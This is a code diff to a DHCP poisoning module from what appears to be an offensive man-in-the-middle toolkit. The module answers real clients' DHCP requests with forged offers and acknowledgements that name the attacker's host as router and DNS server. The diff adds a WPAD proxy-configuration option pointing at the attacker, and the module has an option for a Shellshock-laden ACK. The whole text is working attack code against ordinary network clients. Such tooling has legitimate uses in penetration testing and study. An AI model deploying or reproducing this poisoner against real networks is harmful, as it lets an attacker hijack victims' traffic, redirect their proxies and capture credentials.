@@ -21,7 +21,7 @@ import threading
 import binascii
 import random
 
-from netaddr import IPAddress, IPNetwork, IPRange, AddrFormatError
+from netaddr import IPAddress, IPNetwork
 from core.logger import logger
 from scapy.all import *
 
@@ -30,20 +30,20 @@ log = logger().setup_logger("DHCPpoisoner", formatter)
 
 class DHCPpoisoner():
 
-    def __init__(self, options, dhcpcfg):
+    def __init__(self, options):
         self.interface   = options.interface
         self.ip_address  = options.ip
         self.mac_address = options.mac
         self.shellshock  = options.shellshock
+        self.netmask     = options.netmask
         self.debug       = False
-        self.dhcpcfg     = dhcpcfg
         self.dhcp_dic    = {}
 
         log.debug("interface  => {}".format(self.interface))
         log.debug("ip         => {}".format(self.ip_address))
         log.debug("mac        => {}".format(self.mac_address))
+        log.debug("netmask    => {}".format(self.netmask))
         log.debug("shellshock => {}".format(self.shellshock))
-        log.debug("dhcpcfg    => {}".format(self.dhcpcfg))
 
     def start(self):
         self.s2 = conf.L2socket(iface=self.interface)
@@ -62,30 +62,24 @@ class DHCPpoisoner():
             if "Interrupted system call" not in e:
                log.error("Exception occurred while poisoning: {}".format(e))
 
-    def dhcp_rand_ip(self):
-        pool = self.dhcpcfg['ip_pool']
+    def get_client_ip(self, xid, dhcp_options):
         try:
-            if '/' in pool:
-                ips = list(IPNetwork(pool))
-                return str(random.choice(ips))
+            field_name, req_addr = dhcp_options[2]
+            if field_name == 'requested_addr':
+                return 'requested', req_addr
 
-            elif '-' in pool:
-                start_addr = IPAddress(pool.split('-')[0])
-                try:
-                    end_addr = IPAddress(pool.split('-')[1])
-                    ips = list(IPRange(start_addr, end_addr))
-                except AddrFormatError:
-                    end_addr = list(start_addr.words)
-                    end_addr[-1] = pool.split('-')[1]
+            raise ValueError
+        except ValueError:
+            for field in dhcp_options:
+                if (field is tuple) and (field[0] == 'requested_addr'):
+                    return field[1]
 
-                    end_addr = IPAddress('.'.join(map(str, end_addr)))
-                    ips = list(IPRange(start_addr, end_addr))
+        if xid in self.dhcp_dic.keys():
+            client_ip = self.dhcp_dic[xid]
+            return 'stored', client_ip
 
-                return str(random.choice(ips))
-
-            log.error('Specified invalid CIDR/Network range in DHCP pool option')
-        except AddrFormatError:
-            log.error('Specified invalid CIDR/Network range in DHCP pool option')
+        net = IPNetwork(self.ip_address + '/24')
+        return 'generated', random.choice(list(net))
 
     def dhcp_callback(self, resp):
         if resp.haslayer(DHCP):
@@ -94,15 +88,12 @@ class DHCPpoisoner():
             mac_addr = resp[Ether].src
             raw_mac = binascii.unhexlify(mac_addr.replace(":", ""))
 
-            if xid in self.dhcp_dic.keys():
-                client_ip = self.dhcp_dic[xid]
-            else:
-                client_ip = self.dhcp_rand_ip()
-                self.dhcp_dic[xid] = client_ip
-
             if resp[DHCP].options[0][1] == 1:
-                log.info("Got DHCP DISCOVER from: " + mac_addr + " xid: " + hex(xid))
-                log.info("Sending DHCP OFFER")
+                method, client_ip = self.get_client_ip(xid, resp[DHCP].options)
+                if method == 'requested':
+                    log.info("Got DHCP DISCOVER from: {} requested_addr: {} xid: {}".format(mac_addr, client_ip, hex(xid)))
+                else:
+                    log.info("Got DHCP DISCOVER from: {} xid: {}".format(mac_addr, hex(xid)))
 
                 packet = (Ether(src=self.mac_address, dst='ff:ff:ff:ff:ff:ff') /
                 IP(src=self.ip_address, dst='255.255.255.255') /
@@ -110,19 +101,25 @@ class DHCPpoisoner():
                 BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr=client_ip, siaddr=self.ip_address, xid=xid) /
                 DHCP(options=[("message-type", "offer"),
                     ('server_id', self.ip_address),
-                    ('subnet_mask', self.dhcpcfg['subnet']),
+                    ('subnet_mask', self.netmask),
                     ('router', self.ip_address),
                     ('name_server', self.ip_address),
                     ('dns_server', self.ip_address),
                     ('lease_time', 172800),
                     ('renewal_time', 86400),
                     ('rebinding_time', 138240),
+                    (252, 'http://{}/wpad.dat\\n'.format(self.ip_address)),
                     "end"]))
 
+                log.info("Sending DHCP OFFER")
                 self.s2.send(packet)
 
             if resp[DHCP].options[0][1] == 3:
-                log.info("Got DHCP REQUEST from: " + mac_addr + " xid: " + hex(xid))
+                method, client_ip = self.get_client_ip(xid, resp[DHCP].options)
+                if method == 'requested':
+                    log.info("Got DHCP REQUEST from: {} requested_addr: {} xid: {}".format(mac_addr, client_ip, hex(xid)))
+                else:
+                    log.info("Got DHCP REQUEST from: {} xid: {}".format(mac_addr, hex(xid)))
 
                 packet = (Ether(src=self.mac_address, dst='ff:ff:ff:ff:ff:ff') /
                 IP(src=self.ip_address, dst='255.255.255.255') /
@@ -130,13 +127,14 @@ class DHCPpoisoner():
                 BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr=client_ip, siaddr=self.ip_address, xid=xid) /
                 DHCP(options=[("message-type", "ack"),
                     ('server_id', self.ip_address),
-                    ('subnet_mask', self.dhcpcfg['subnet']),
+                    ('subnet_mask', self.netmask),
                     ('router', self.ip_address),
                     ('name_server', self.ip_address),
                     ('dns_server', self.ip_address),
                     ('lease_time', 172800),
                     ('renewal_time', 86400),
-                    ('rebinding_time', 138240)]))
+                    ('rebinding_time', 138240),
+                    (252, 'http://{}/wpad.dat\\n'.format(self.ip_address))]))
 
                 if self.shellshock:
                     log.info("Sending DHCP ACK with shellshock payload")
